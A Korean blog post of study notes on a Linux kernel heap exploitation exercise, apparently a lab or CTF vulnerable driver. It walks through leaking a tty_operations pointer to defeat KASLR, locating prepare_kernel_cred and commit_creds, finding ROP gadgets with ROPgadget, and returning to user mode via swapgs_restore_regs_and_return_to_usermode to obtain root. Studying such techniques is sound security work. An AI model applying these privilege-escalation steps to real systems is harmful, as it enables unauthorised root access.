---
layout: post
title: heap
date: 2025-11-10 22:51:00 +0900
category: kernel
---

핵심은 **덤프 속 `0xffffffff81c38880`가 전역 `tty_operations`(대개 `ptm_unix98_ops`)의 “절대 주소”**이고,

우리가 이미 알아낸 **커널 베이스 `_stext = 0xffffffff81000000`**와의 차가 곧 **ofs_tty_ops**라는 점이에요.

이미지 주소들을 그대로 짚어볼게요.

1. 화면 왼쪽이 **`g_buf + 0x400`*부터의 QWORD 덤프죠.
    
    줄 2칸 오른쪽에 **`0xffffffff81c38880`**가 보입니다.
    
2. 위 값을 **누출된 `tty->ops` 포인터**로 해석합니다.
    
    (익스 코드에서도 `*(u64*)&buf[0x418]` 위치를 `tty->ops`로 읽어 kbase를 구하죠.)
    
3. 커널 텍스트 베이스는 앞서 확인한 대로:
    
    ```
    _stext = 0xffffffff81000000
    
    ```
    
4. 차이를 빼면:
    
    ```
    0xffffffff81c38880
    
    ```
    
- 0xffffffff81000000
    
    = 0x0000000000c38880
    
    ```
    → **ofs_tty_ops = 0xC38880**
    
    ```
    
1. 덤프에 같이 찍힌 `0xffff88800303b438`, `...b448` 등은
    
    **`g_buf` 내부 필드들이 자기 자신의 오프셋을 가리키는 값**이라서, 코드에서
    
    ```
    g_buf = leaked_ptr_at_0x438 - 0x438
    
    ```
    
    계산이 맞다는 것도 함께 검증됩니다. 실제로 화면의 베이스가 `g_buf=0xffff88800303b000`이고,
    
    거기에 `+0x438` 하면 `0xffff88800303b438`가 되어 덤프 값과 일치하죠.
    

정리하면, **이미지 속 `0xffffffff81c38880`(ops 절대주소) − `_stext`**가 **0xC38880**이기 때문에

그 값을 `#define ofs_tty_ops 0xc38880`로 쓰는 겁니다.

![image.png](attachment:d319d1b0-d221-469a-b6fa-1a2e0007c717:image.png)

---

- 권한 승격

![image.png](attachment:cd04b77a-bd3f-42c3-8120-36e55ac9e90f:image.png)

```bash
grep prepare_kernel_cred /proc/kallsyms
ffffffff81074650 T prepare_kernel_cred
grep commit_creds /proc/kallsyms
ffffffff810744b0 T commit_creds
```

- 커널→ 사용자 공간
    - iretq
    - 커널모드의 GS 세그먼터에서 사용자 모드의 GS세그먼트로 전환 ⇒ swapgs
    - RSP, RIP, CS, SS, RFLAG 사용자 공간의 것으로 전환
- 베이스 주소

```bash
cat  /proc/modules
```

![image.png](attachment:7d78d234-ca64-4488-b648-fcb1c5c6ae34:image.png)

![image.png](attachment:524d6124-4da1-46d5-be5c-37259b56774a:image.png)

gbuf를 알 수 있는 위치(0xffffffffc001221d)=모듈의 위치+ gbuf의 위치를 알 수 있는 오프셋

![image.png](attachment:3e7a8865-4d72-46f7-892a-00968548ec47:image.png)

gbuf의 위치=0xffff8880030f7000

gbuf의 크기= 0x400

gbuf와 인접한 모듈안의 객체=0xffffffff81c38880

![image.png](attachment:86e91759-3bcb-4a90-98a0-b43a4853b4c8:image.png)

- 베이스 추출
    
    ```bash
    cat /proc/kallsyms | grep (찾은 주소)
    ```
    
    오프셋= 0xffffffff81c38880-0xffffffff81000000
    
    - 0xffffffff81000000?⇒ .text 시작 위치
    
    ![image.png](attachment:94916e39-a406-4668-ac54-591082865401:image.png)
    
    kbase= gbuf[418]- 오프셋(c38880/0xffffffff81c38880-0xffffffff81000000)
    
- 가젯 구하기

```bash
ROPgadget --binary ./vmlinux | grep "pop rdi ; ret"
0xffffffff810d748d : pop rdi ; ret
ROPgadget --binary ./vmlinux | grep "pop rcx; ret"
0xffffffff8113c1c4 : pop rcx ; ret
ROPgadget --binary ./vmlinux | grep "mov rdi, rax; rep movsq [rdi], [rsi]; ret "
0xffffffff8162707b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
```

![image.png](attachment:beb3ca94-04fb-45ec-8fc5-7ff0987bdd74:image.png)

![image.png](attachment:291b8c3d-fcb0-4380-977a-8e66237bffd4:image.png)

![image.png](attachment:353550c1-96e5-4203-9ad7-ca0156b4b8df:image.png)

- swapgs_restore_regs_and_return_to_usermode

```bash
cat /proc/kallsyms|grep swapgs_restore_regs_and_return_to_usermode
ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode

 0xffffffff81800e26:  mov    rdi,rsp
```

![image.png](attachment:52bb158f-a6d8-4d9c-a8b3-e7ca00241981:image.png)

![image.png](attachment:71fbc47e-2938-495e-9515-bb3c8d77a9d6:image.png)

![image.png](attachment:15bca9fa-f5b0-47e9-8dc7-ccdefbba931c:image.png)

1. 베이스 주소 유출시켜야함
2. 가젯 찾아야함
3. 권한 승격
    - system(’/bin/sh’)⇒ commit_creds(prepare_kernel_cred(NULL))
4. 커널안에서 권한상승후 사용자공간으로 돌아와서 권한 승격을 해야함
    - swapgs_restore_regs_and_return_to_usermode